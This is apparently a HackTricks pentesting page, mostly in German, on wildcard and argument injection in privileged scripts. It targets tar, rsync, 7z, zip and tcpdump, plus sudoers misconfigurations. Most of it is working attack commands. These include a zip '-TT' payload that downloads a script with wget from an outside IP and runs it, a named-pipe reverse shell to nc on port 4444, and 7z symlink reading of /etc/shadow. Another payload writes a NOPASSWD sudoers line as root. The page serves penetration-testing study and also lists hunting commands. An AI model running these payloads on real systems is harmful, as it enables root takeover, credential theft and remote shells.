# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** passiert, wenn ein privilegiertes Skript ein Unix-Binary wie `tar`, `chown`, `rsync`, `zip`, `7z`, … mit einem nicht in Anführungszeichen gesetzten Wildcard wie `*` ausführt.
> Da die Shell den Wildcard **vor** dem Ausführen des Binary expandiert, kann ein Angreifer, der Dateien im Arbeitsverzeichnis erstellen kann, Dateinamen so gestalten, dass sie mit `-` beginnen und dadurch als **Optionen statt als Daten** interpretiert werden, wodurch sich effektiv beliebige Flags oder sogar Commands einschleusen lassen.
> Diese Seite sammelt die nützlichsten Primitives, aktuelle Forschung und moderne Detections für 2023-2025.

## chown / chmod

Du kannst den **Besitzer/Gruppe oder die Permission-Bits einer beliebigen Datei kopieren**, indem du das `--reference`-Flag missbrauchst:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wenn root später etwas wie das Folgende ausführt:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` wird injiziert und bewirkt, dass *alle* passenden Dateien den Besitz/die Berechtigungen von `/root/secret``file` erben.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
Siehe auch das klassische DefenseCode-Paper für Details.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Führe beliebige Befehle aus, indem du die **checkpoint**-Funktion ausnutzt:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Sobald root z. B. `tar -czf /root/backup.tgz *` ausführt, wird `shell.sh` als root ausgeführt.

### bsdtar / macOS 14+

Das standardmäßige `tar` auf neueren macOS-Versionen (basierend auf `libarchive`) implementiert `--checkpoint` *nicht*, aber du kannst trotzdem Code-Ausführung mit dem Flag **--use-compress-program** erreichen, das es dir erlaubt, einen externen Compressor anzugeben.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wenn ein privilegiertes Skript `tar -cf backup.tar *` ausführt, wird `/bin/sh` gestartet.

---

## rsync

`rsync` erlaubt dir, die Remote-Shell oder sogar das Remote-Binary über Kommandozeilen-Flags zu überschreiben, die mit `-e` oder `--rsync-path` beginnen:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Wenn root das Verzeichnis später mit `rsync -az * backup:/srv/` archiviert, startet das injizierte Flag deine Shell auf der Remote-Seite.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Selbst wenn das privilegierte Script das Wildcard *defensiv* mit `--` voranstellt (um das Option-Parsing zu stoppen), unterstützt das 7-Zip-Format **file list files**, indem der Dateiname mit `@` vorangestellt wird.  Kombiniert man das mit einem symlink, kann man *beliebige Dateien exfiltrieren*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Wenn root etwas ausführt wie:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip wird versuchen, `root.txt` (→ `/etc/shadow`) als Dateiliste zu lesen und mit einem Fehler abbrechen, wobei es **den Inhalt auf stderr ausgibt**.

Das überlebt `-- *`, weil die 7-Zip-CLI ausdrücklich sowohl reguläre Dateinamen als auch `@listfiles` als Positionsargumente akzeptiert, sodass ein literaler Dateiname wie `@root.txt` weiterhin speziell behandelt wird.

---

## zip

Es gibt zwei sehr praktische Primitive, wenn eine Anwendung vom Nutzer kontrollierte Dateinamen an `zip` übergibt (entweder über ein wildcard oder durch Auflisten von Namen ohne `--`).

- RCE via test hook: `-T` aktiviert „test archive“ und `-TT <cmd>` ersetzt den Tester durch ein beliebiges Programm (Langform: `--unzip-command <cmd>`). Wenn du Dateinamen injizieren kannst, die mit `-` beginnen, teile die Flags auf separate Dateinamen auf, damit das Parsing von short-options funktioniert:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Hinweise
- Versuche NICHT einen einzelnen Dateinamen wie `'-T -TT <cmd>'` — kurze Optionen werden Zeichen für Zeichen geparst und das wird fehlschlagen. Verwende separate Tokens wie gezeigt.
- Wenn Slashes von Dateinamen durch die App entfernt werden, hole von einem nackten Host/IP (Standardpfad `/index.html`) und speichere lokal mit `-O`, dann ausführen.
- Du kannst das Parsen mit `-sc` (verarbeitetes argv anzeigen) oder `-h2` (mehr Hilfe) debuggen, um zu verstehen, wie deine Tokens konsumiert werden.

Beispiel (lokales Verhalten auf zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: If the web layer echoes `zip` stdout/stderr (common with naive wrappers), injected flags like `--help` or failures from bad options will surface in the HTTP response, confirming command-line injection and aiding payload tuning.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## Hunting vulnerable wrappers and jobs

Recent case studies have shown that wildcard/argv injection is no longer just a **cron + tar** problem. The same bug class keeps appearing in:

- web features that "download everything as zip/tar" from attacker-controlled upload directories
- vendor/appliance debug shells that expose a **tcpdump** wrapper with attacker-controlled filename/filter fields
- backup or rotation jobs that call `tar`, `rsync`, `7z`, `zip`, `chown`, or `chmod` on writable directories

Useful triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Schnelle Heuristiken:

- `-- *` ist ein guter Fix für viele GNU tools, aber **nicht** für `7z`/`7za`, weil `@listfiles` separat geparst werden.
- Bei `zip` solltest du nach Wrappers suchen, die benutzerkontrollierte Dateinamen direkt auflisten; Short-Option-Splitting (`-T` + `-TT <cmd>`) funktioniert auch ohne Shell-Glob.
- Bei `tcpdump` achte besonders auf Wrappers, die dir die Kontrolle über **output file names**, **rotation settings** oder **capture-file replay**-Argumente geben.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Wenn eine eingeschränkte Shell oder ein Vendor-Wrapper eine `tcpdump`-Command-Line durch Konkatenation benutzerkontrollierter Felder (z. B. ein "file name"-Parameter) ohne striktes Quoting/Validation baut, kannst du zusätzliche `tcpdump`-Flags einschleusen. Die Kombination aus `-G` (zeitbasierte Rotation), `-W` (Anzahl der Dateien begrenzen) und `-z <cmd>` (Post-Rotate-Command) führt zu beliebiger command execution als der User, der `tcpdump` ausführt (oft root auf Appliances).

Voraussetzungen:

- Du kannst das an `tcpdump` übergebene `argv` beeinflussen (z. B. über einen Wrapper wie `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Der Wrapper sanitizt weder Spaces noch `-`-präfixierte Tokens im File-Name-Feld.

Klassischer PoC (führt ein Reverse-Shell-Script von einem beschreibbaren Pfad aus):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` erzwingt eine sofortige Rotation nach dem ersten passenden Paket.
- `-z <cmd>` führt den post-rotate command einmal pro Rotation aus. Viele Builds führen `<cmd> <savefile>` aus. Wenn `<cmd>` ein script/interpreter ist, stelle sicher, dass das Argument-Handling zu deinem payload passt.

No-removable-media-Varianten:

- Wenn du irgendeine andere primitive zum Schreiben von Dateien hast (z. B. ein separater command wrapper, der output redirection erlaubt), lege dein script in einem bekannten Pfad ab und triggere `-z /bin/sh /path/script.sh` oder `-z /path/script.sh` je nach platform semantics.
- Manche vendor wrappers rotieren in attacker-controllable locations. Wenn du den rotierten Pfad beeinflussen kannst (symlink/directory traversal), kannst du `-z` so steuern, dass Inhalt ausgeführt wird, den du vollständig kontrollierst, ohne externe media.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Sehr häufiges sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Probleme
- Der `*`-glob und permissive patterns beschränken nur das erste `-w`-Argument. `tcpdump` akzeptiert mehrere `-w`-Optionen; die letzte gewinnt.
- Die Regel pinnt andere Optionen nicht, daher sind `-Z`, `-r`, `-V` usw. erlaubt.

Primitives
- Überschreibe den Zielpfad mit einem zweiten `-w` (das erste erfüllt nur sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal innerhalb des ersten `-w`, um den eingeschränkten Baum zu verlassen:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Erzwinge die Ausgabe-Eigentümerschaft mit `-Z root` (erstellt root-owned Dateien überall):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Arbitrary-content schreiben, indem ein präpariertes PCAP über `-r` wiedergegeben wird (z. B. um eine sudoers-Zeile abzulegen):

<details>
<summary>Erstelle ein PCAP, das die exakte ASCII-Payload enthält, und schreibe sie als root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Arbitrary file read/secret leak with `-V <file>` (interpretiert eine Liste von Savefiles). Error-Diagnostics echoen oft Zeilen und leaken dabei Inhalt:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referenzen

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
